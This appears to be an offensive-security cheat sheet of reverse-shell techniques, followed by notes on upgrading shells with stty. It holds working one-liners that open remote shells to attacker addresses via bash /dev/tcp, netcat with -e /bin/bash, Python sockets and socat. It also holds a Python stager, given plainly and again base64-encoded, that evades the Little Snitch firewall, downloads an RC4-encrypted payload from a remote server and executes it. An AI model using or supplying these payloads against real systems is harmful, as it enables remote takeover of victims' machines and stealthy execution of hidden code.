# Reverse Shells

## Bash
```bash
bash -i >& /dev/tcp/10.10.14.23/1234 0>&1
```

## python
```python
import sys
import re 
import subprocess

cmd = "ps -ef | grep Little\ Snitch | grep -v grep"
ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
out = ps.stdout.read()
ps.stdout.close()

if re.search("Little Snitch", out):
   sys.exit()

import urllib2;

UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
server='http://192.168.100.15:80';
t='/admin/get.php';
req=urllib2.Request(server+t);
req.add_header('User-Agent',UA);
req.add_header('Cookie',"session=hdN8lA2yDkGiD8sWWYXJTtm+J14=");
proxy = urllib2.ProxyHandler();
o = urllib2.build_opener(proxy);
urllib2.install_opener(o);
a=urllib2.urlopen(req).read();
IV=a[0:4];
data=a[4:];
key=IV+'At&(7gx@?MF!jwbSs4H~l-XLPrOCzi:E';
S,j,out=range(256),0,[]
for i in range(256):
    j=(j+S[i]+ord(key[i%len(key)]))%256
    S[i],S[j]=S[j],S[i]
i=j=0
for char in data:
    i=(i+1)%256
    j=(j+S[i])%256
    S[i],S[j]=S[j],S[i]
    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))
exec(''.join(out))
```
```bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xOTIuMTY4LjEwMC4xNTo4MCc7dD0nL2FkbWluL2dldC5waHAnO3JlcT11cmxsaWIyLlJlcXVlc3Qoc2VydmVyK3QpOwpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsVUEpOwpyZXEuYWRkX2hlYWRlcignQ29va2llJywic2Vzc2lvbj1oZE44bEEyeURrR2lEOHNXV1lYSlR0bStKMTQ9Iik7CnByb3h5ID0gdXJsbGliMi5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKHByb3h5KTsKdXJsbGliMi5pbnN0YWxsX29wZW5lcihvKTsKYT11cmxsaWIyLnVybG9wZW4ocmVxKS5yZWFkKCk7CklWPWFbMDo0XTtkYXRhPWFbNDpdO2tleT1JVisnQXQmKDdneEA/TUYhandiU3M0SH5sLVhMUHJPQ3ppOkUnO1MsaixvdXQ9cmFuZ2UoMjU2KSwwLFtdCmZvciBpIGluIHJhbmdlKDI1Nik6CiAgICBqPShqK1NbaV0rb3JkKGtleVtpJWxlbihrZXkpXSkpJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQppPWo9MApmb3IgY2hhciBpbiBkYXRhOgogICAgaT0oaSsxKSUyNTYKICAgIGo9KGorU1tpXSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCiAgICBvdXQuYXBwZW5kKGNocihvcmQoY2hhcileU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));" | /usr/bin/python &
```

## Bind
```
C2     -> nc 192.168.0.192 4444
client -> nc -lvnp 4444 -e /bin/bash
```

## Reverse
```
client -> nc 192.168.0.192 4444 -e /bin/bash 
C2     -> nc -lvnp 4444
```

## Socket based python shell
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",7331));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
import socket
import subprocess
import os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("",7331))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## Using stty options to upgrade a shell
```bash
# In reverse shell
    python -c 'import pty; pty.spawn("/bin/bash")'
    Ctrl-Z
# In Kali
    echo $TERM
    stty -a
    stty raw -echo
    fg
# In reverse shell
    reset
    export SHELL=bash
    export TERM=xterm-256color
    stty rows <num> columns <cols>
```
For the carriage return mishandling thing, just run your listener on a bash instead of zsh
   

## Using socat
Listener:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
Victim:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## STTY
Options
```
-a     # Display all current settings
-e     # Display all current settings BSD style 
-g     # Display all current settings in restorable format 
```

## Local   Modes (lflags -> line discipline flag)
```
echo   # Echo or do not echo every character typed 
```

## Combination Modes 
```
raw    # no input or output processing is performed.
sane   # Resets all modes to reasonable values for interactive terminal use.
rows   # The terminal size is recorded as having number rows.
cols   # The terminal size is recorded as having number cols.
size   # The size of the terminal is printed as two numbers on a single line, first rows, then columns.
```

## Compatibility Modes (legacy command names, maintained for compatibility)
```
cooked # same as sane 
```




